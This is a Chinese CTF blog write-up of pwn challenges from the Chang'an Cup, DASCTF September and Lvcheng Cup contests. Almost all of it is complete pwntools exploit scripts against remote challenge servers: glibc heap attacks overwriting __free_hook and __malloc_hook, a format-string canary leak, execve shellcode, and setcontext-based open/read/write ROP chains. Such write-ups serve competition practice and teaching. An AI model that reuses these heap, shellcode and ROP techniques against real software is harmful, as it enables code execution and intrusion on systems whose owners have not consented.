---
title: 长安杯 绿城杯 DASCTF Sept pwn部分
date: 2021-09-30 22:51:18
tags:
	- ORW
	- 随机数爆破
	- size错位
	- shellcode
---

> 我累了，可能也有点xxxx了，我想把眼前的是事情放一放，自由地做些事情把。。。。。。。。。。。

## 长安杯

> 别怪我，就做出这一个，不过别人也没把其他的做出来
> 问了师兄，题目来源于Nu1L，最后成绩20多名吧

### baigei

* 算是逻辑上有问题，可以重置size
  
  
```python
#!/usr/bin/env python
from pwn import *

binary = "./main"
lib = "./libc-2.27.so"
# p = process(binary)
p = remote("113.201.14.253","")
elf = ELF(binary)
libc = ELF(lib)
# context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)

def add(id,size,content):
	sal(">>\n","1")
	sal("idx?\n",str(id))
	sal("size?\n",str(size))
	sa("content?\n",content)
def resetSize(id):
	sal(">>\n","1")
	sal("idx?\n",str(id))
	sal("size?\n",str(0x450))
def edit(id,size,content):
	sal(">>\n","3")
	sal("idx?\n",str(id))
	sal("size?\n",str(size))
	sa("content?\n",content)
def free(id):
	sal(">>\n","2")
	sal("idx?\n",str(id))
def show(id):
	sal(">>\n","4")
	sal("idx?\n",str(id))


add(0,0x88,"A")
add(1,0x88,"A")
free(0)
free(1)
add(0,0x88,"A")
show(0)
ru(": ")
heap = u64(r(6)+"\x00\x00") - 0x241
info("heap => 0x%x"%heap)
add(0,0x88,"A")

for _ in range(8):
	add(_,0x88,"A")
for _ in range(7):
	free(7-_)
free(0)
add(0,0x18,"A")
show(0)
libc.address = u64(ru("\x7f")[-6:]+"\x00\x00")-257-0x10 - libc.sym["__malloc_hook"]
info("libc base => 0x%x"%libc.address)

for _ in range(7):
	add(0,0x88,"A")
add(0,0x68,"A")

add(0,0x18,"A")
add(1,0x18,"B")
add(2,0x18,"C")
add(3,0x18,"C")

resetSize(0)
free(2)
free(1)
payload = ""
payload += p64(0)*3
payload += p64(0x21)
payload += p64(libc.sym["__free_hook"]-8)
edit(0,0x40,payload)

add(0,0x18,"A")
add(0,0x18,"/bin/sh\x00"+p64(libc.sym["system"]))
free(0)
sh()
```

## DASCTF九月月赛

> 这个和长安杯冲突了，就先顾长安杯了，毕竟与学校有关系。

### hehepwn

```python
#!/usr/bin/env python
from pwn import *

binary = "./bypwn"
# lib = "./libc-2.27.so"
# p = process(binary)
p = remote("node4.buuoj.cn","26780")
elf = ELF(binary)
# libc = ELF(lib)
# context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)

ru("well you input:\n")
sl("A"*0x20)
ru("check it, ")
r(0x20)
stack = u64(r(6)+"\x00\x00")
info("stack => 0x%x"%stack)

shell = '''
mov rdi,0x68732f6e69622f
push rdi
mov rdi,rsp
xor rsi,rsi
xor rdx,rdx
mov rax,0x3b
syscall
'''
shell = "\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x48\x89\xe7\x48\x31\xf6\x48\x31\xd2\x48\xc7\xc0\x3b\x00\x00\x00\x0f\x05"
# shell = asm(shell,arch="amd64")
# print("".join("\\x%02x"%ord(_) for _ in shell))
ru("PWN~\n")
sl(shell.ljust(0x50,"B")+"A"*8+p64(stack-0x50))

sh()

```

### datasystem

* 内阁 前边那个绕过就很麻烦，哎
* `int snprintf(char *str, size_t size, const char *format, ...);` 其返回值为printf出的个数

```python
#!/usr/bin/env python
from pwn import *
from os import urandom
binary = "./datasystem"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
# p = process(binary)
p = remote("node4.buuoj.cn","25256")
# flag{3e414a31-e42a-4f78-9183-e91c05ce670e}
elf = ELF(binary)
libc = ELF(lib)
context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)
gadget = lambda ins: libc.search(asm(ins,arch="amd64")).next()
def crack(p,data):
	ru("please input username: ")
	s("admin")
	ru("please input password: ")
	s(data)
def add(size,content):
	sal(">> :","1")
	sal("Size:",str(size))
	sa("Content:",content)
def free(id):
	sal(">> :","2")
	sal("Index:",str(id))
def show(id):
	sal(">> :","3")
	sal("Index:",str(id))
def edit(id,content):
	sal(">> :","4")
	sal("Index:",str(id))
	sa("Content:",content)

# for _ in range(0x5000):
# 	p = process(binary)
# 	ur = urandom(0x20) #the length must be 0x20 to end the md5 pwd
# 	crack(p,ur)
# 	if("Fail" in r()):
# 		p.close()
# 	else:
# 		print("".join("\\x%02x"%ord(_) for _ in ur))
# 		raw_input()

pwd = "\x94\x6c\x50\x3a\x06\xbc\x2d\x7e\xcf\x58\xfb\x15\x13\xa8\xb0\x81\x50\xe9\xd9\xbe\x67\xf1\xbc\x94\xbe\x4c\x12\x54\xe7\xe8\x74\xb3"
crack(p,pwd)

# to leak heap
add(0,"A")
add(0,"A")
free(0)
free(1)
add(0,"A")
show(0)
ru("Content: ")
heap = u64(r(6)+"\x00\x00")-0x241
info("heap base => 0x%x"%heap)

# to leak libc
free(0)
add(0x450,"A")
add(0x18,"B")
add(0x18,"B")
add(0x18,"B")
free(0)
add(0,"A")
show(0)
libc.address = u64(ru("\x7f")[-6:]+"\x00\x00")-1025-0x10-libc.sym["__malloc_hook"]
info("libc base => 0x%x"%libc.address)

# to change malloc_hook
free(1)
free(3)
add(0x438,"\x00"*0x438+p64(0x21)+p64(libc.sym["__free_hook"]))
add(0,"A")
add(0,p64(libc.sym["setcontext"]+53))

rdi = heap+0x720
pop_rdi = gadget("pop rdi;ret")
pop_rsi = gadget("pop rsi;ret")
pop_rdx = gadget("pop rdx;ret")
pop_rax = gadget("pop rax;ret")
syscall = gadget("syscall;ret")

rop = ""
rop += "./flag\x00".ljust(8,"\x00")
rop += p64(0)*12
rop += p64(rdi)
rop += p64(0)*6

rop += p64(rdi+0xb0)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(7)
rop += p64(pop_rax)
rop += p64(0x2)
rop += p64(syscall)
rop += p64(pop_rdi)
rop += p64(3)
rop += p64(pop_rsi)
rop += p64(rdi)
rop += p64(pop_rdx)
rop += p64(0x80)
rop += p64(pop_rax)
rop += p64(0)
rop += p64(syscall)
rop += p64(pop_rdi)
rop += p64(1)
rop += p64(pop_rax)
rop += p64(1)
rop += p64(syscall)
add(0x150,rop)
free(5)

sh()
```

### hahapwn

```python
#!/usr/bin/env python
from pwn import *

binary = "./pwn"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
# p = process(binary)
p = remote("node4.buuoj.cn","29600")
elf = ELF(binary)
libc = ELF(lib)
# context.log_level = "debug"
# flag{96850486-5e1e-4b27-90fe-9d026d95be40}

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)
gadget = lambda ins: libc.search(asm(ins,arch="amd64")).next()


ru("Welcome! What is your name?\n")
payload = ""
payload += "%27$p"
sl(payload)
ru("Hello \n")
canary = int(ru("\n"),16)
info("canary => 0x%x"%canary)
ru("What can we help you?\n")
sl("A"*(0x70-8)+p64(canary)+"a"*8+p64(0x4007B8))



ru("Welcome! What is your name?\n")
payload = ""
payload += "%8$p"
sl(payload)
ru("Hello \n")
libc.address = int(ru("\n"),16)-libc.sym["_IO_2_1_stdout_"]
info("libc base => 0x%x"%libc.address)
ru("What can we help you?\n")
sl("A"*(0x70-8)+p64(canary)+"a"*8+p64(0x4007B8))



ru("Welcome! What is your name?\n")
payload = ""
payload += "%28$p"
sl(payload)
ru("Hello \n")
stack = int(ru("\n"),16)
info("stack base => 0x%x"%stack)
ru("What can we help you?\n")
sl("A"*(0x70-8)+p64(canary)+"a"*8+p64(0x4007B8))



ru("Welcome! What is your name?\n")
sl("cat03")
ru("What can we help you?\n")

pop_rdi = gadget("pop rdi;ret")
pop_rsi = gadget("pop rsi;ret")
pop_rdx = gadget("pop rdx;ret")
pop_rax = gadget("pop rax;ret")
syscall = gadget("syscall;ret")


payload = ""
payload += "./flag\x00".ljust((0x70-8),"A")
payload += p64(canary)
payload += "A"*8
payload += p64(pop_rdi)
payload += p64(stack-0x108)
payload += p64(pop_rsi)
payload += p64(0)
payload += p64(pop_rdx)
payload += p64(0)
payload += p64(pop_rax)
payload += p64(2)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(3)
payload += p64(pop_rsi)
payload += p64(stack-0x108)
payload += p64(pop_rdx)
payload += p64(0x80)
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall)

payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall)
sl(payload)
sh()

 # line  CODE  JT   JF      K
 # =================================
 # 0000: 0x20 0x00 0x00 0x00000000  A = sys_number
 # 0001: 0x15 0x00 0x01 0x0000003b  if (A != execve) goto 0003
 # 0002: 0x06 0x00 0x00 0x00000000  return KILL
 # 0003: 0x06 0x00 0x00 0x7fff0000  return ALLOW

```


## 绿城杯

> 这个也是二十多名
 
### pwn_null

* 虽然没开pie可以用unlink，但是用这个size错位的更通用些

```python
#!/usr/bin/env python
from pwn import *

binary = "./null_pwn"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
# p = process(binary)
p = remote("82.157.5.28","51304")

elf = ELF(binary)
libc = ELF(lib)
context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)

def add(id,size,content):
	sal("Your choice :","1")
	sal("Index:",str(id))
	sal("Size of Heap : ",str(size))
	sa("Content?:",content)
def free(id):
	sal("Your choice :","2")
	sal("Index:",str(id))
def show(id):
	sal("Your choice :","4")
	sal("Index :",str(id))
def edit(id,content):
	sal("Your choice :","3")
	sal("Index:",str(id))
	sa("Content?:",content)

add(0,0x88,"A")
add(1,0x18,"B")
free(0)
add(0,1,"A")
show(0)
libc.address = u64(ru("\x7f")[-6:]+"\x00\x00")-33-0x10 - libc.sym["__malloc_hook"]
info("libc base => 0x%x"%libc.address)
add(0,0x68,"A")

add(0,0x18,"A")
add(1,0x18,"B")
add(2,0x68,"C")
add(3,0x18,"D")

free(2)
edit(0,"\x00"*0x18+chr(0x71+0x20))
free(1)

add(4,0x18,"E")
add(5,0x58,"F")
edit(5,p64(libc.sym["__malloc_hook"]-0x23))
add(6,0x68,"G")
add(7,0x68,"H")
# edit(7,"A")

ogg = [_+libc.address for _ in (0x45226,0x4527a,0xf03a4,0xf1247)]
og  = ogg[1]
edit(7,"\x00"*(0x13-8)+p64(og)+p64(libc.sym["realloc"]+16)+"\n")

sal("Your choice :","1")
sal("Index:",str(0))
sal("Size of Heap : ",str(0x20))
sh()
```

### uaf_pwn

* size错位很好用

```python
#!/usr/bin/env python
from pwn import *

binary = "./uaf_pwn"
lib = "/lib/x86_64-linux-gnu/libc.so.6"
p = process(binary)
# p = remote("82.157.5.28","51304")

elf = ELF(binary)
libc = ELF(lib)
context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)


def add(size):
	sl("1")
	sal("size>",str(size))
def free(id):
	sl("2")
	sal("index>",str(id))
def show(id):
	sl("4")
	sal("index>",str(id))
def edit(id,content):
	sl("3")
	sal("index>",str(id))
	sal("content>",content)

add(0x88)
add(0x68)
add(0x68)
free(0)
show(0)
libc.address = u64(ru("\x7f")[-6:]+"\x00\x00")-88-0x10 - libc.sym["__malloc_hook"]
info("libc base => 0x%x"%libc.address)

free(1)
free(2)
edit(2,p64(libc.sym["__malloc_hook"]-0x23))
add(0x68)
add(0x68)
ogg = [_+libc.address for _ in (0x45226,0x4527a,0xf03a4,0xf1247)]
og  = ogg[3]
edit(4,"\x00"*(0x13-8)+p64(og)+p64(libc.sym["realloc"]+16)+"\n")
add(0)
sh()
```
### GreentownNote

* 比赛时这题被队友py了
* 另外libc2.27新版本不清除key，无法tcache double free，如果实在清除不了，也可fastbin double free
* 但是这个版本可以`2.27-3ubuntu1`可以直接tcache double free，也怪不得附件要把ld一起给了

```python
#!/usr/bin/env python
from pwn import *

binary = "./GreentownNote"
lib = "/home/giles/tools/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so"
p = process(binary)
# p = remote("82.157.5.28","51304")
elf = ELF(binary)
libc = ELF(lib)
context.log_level = "debug"

s = lambda buf: p.send(buf)
sl = lambda buf: p.sendline(buf)
sa = lambda delim, buf: p.sendafter(delim, buf)
sal = lambda delim, buf: p.sendlineafter(delim, buf)
sh = lambda: p.interactive()
r = lambda n=None: p.recv(n)
ra = lambda t=tube.forever:p.recvall(t)
ru = lambda delim: p.recvuntil(delim)
rl = lambda: p.recvline()
rls = lambda n=2**20: p.recvlines(n)

def add(size,content):
	sal("Your choice :","1")
	sal("Note size :",str(size))
	sa("Content :",content)
def free(id):
	sal("Your choice :","3")
	sal("Index :",str(id))
def show(id):
	sal("Your choice :","2")
	sal("Index :",str(id))
def myTcache(tcache):
	id = ""
	ptr = ""
	tcache_id = tcache.keys()
	for i in range(2,66):
		if i*0x10 in tcache_id:
			id  += chr(tcache[i*0x10][0])
			ptr += p64(tcache[i*0x10][1])
		else:
			id  += chr(0)
			ptr += p64(0)
	return id+ptr
add(0x248,"cat03 do not py!!!")
free(0)
free(0)
show(0)
ru("Content: ")
heap = u64(r(6)+"\x00\x00")-0x260
info("heap base => 0x%x"%heap)
add(0x248,p64(heap+0x10))
add(0x248,"I don't like py")
add(0x248,"\x00")
free(2)
show(2)
libc.address = u64(ru("\x7f")[-6:]+"\x00\x00")-96-0x10 - libc.sym["__malloc_hook"]
info("libc base => 0x%x"%libc.address)
tcacheChunk = {
0x250   : [1,libc.sym["__free_hook"]],
}
add(0x248,myTcache(tcacheChunk))
add(0x248,p64(libc.sym["setcontext"]+53))

pop_rdi = 0x000000000002155f+libc.address
pop_rsi = 0x0000000000023e6a+libc.address
pop_rdx = 0x0000000000001b96+libc.address
pop_rax = 0x00000000000439c8+libc.address
syscall = 0x00000000000e58e5+libc.address
rdi = heap+0x4b0


rop = ""
rop += "./flag\x00".ljust(8,"\x00")
rop += p64(0)*12
rop += p64(rdi)
rop += p64(0)*6

rop += p64(rdi+0xb0)
rop += p64(pop_rsi)
rop += p64(0)
rop += p64(pop_rdx)
rop += p64(7)
rop += p64(pop_rax)
rop += p64(0x2)
rop += p64(syscall)
rop += p64(pop_rdi)
rop += p64(3)
rop += p64(pop_rsi)
rop += p64(rdi)
rop += p64(pop_rdx)
rop += p64(0x80)
rop += p64(pop_rax)
rop += p64(0)
rop += p64(syscall)
rop += p64(pop_rdi)
rop += p64(1)
rop += p64(pop_rax)
rop += p64(1)
rop += p64(syscall)

add(0x200,rop)
free(4)
sh()
```

